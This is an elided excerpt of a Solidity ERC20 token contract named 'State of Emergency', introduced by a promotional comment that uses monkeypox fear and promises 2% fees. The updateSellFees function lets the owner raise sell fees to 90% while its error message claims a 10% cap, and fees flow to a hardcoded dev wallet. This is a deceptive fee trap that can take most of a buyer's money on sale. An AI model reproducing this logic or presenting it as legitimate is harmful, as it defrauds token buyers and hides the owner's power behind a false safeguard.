...
This is a heads up to those in all the states
That have MonkeyPox popping up
Please be safe

I'm forking PYRO and putting fees as really low (2% buy / sell)

California, New York, and what other states?
Take this seriously, and we can get through it together
@monkeypoxSOE
...
contract SOE is ERC20, Ownable {
    ...
    constructor() ERC20("State of Emergency", "SOE") {
        ...
        devWallet = 0x34648B1430F28D00903C1C7226B6a928BCEEa0D9;
    ...
    function updateSellFees(uint256 _burnFee, uint256 _devFee) external onlyOwner {
        ...
        sellDevFee = _devFee;
        sellTotalFees = sellBurnFee + sellDevFee;
        require(sellTotalFees <= 90, "Must keep fees at 10% or less");
    }
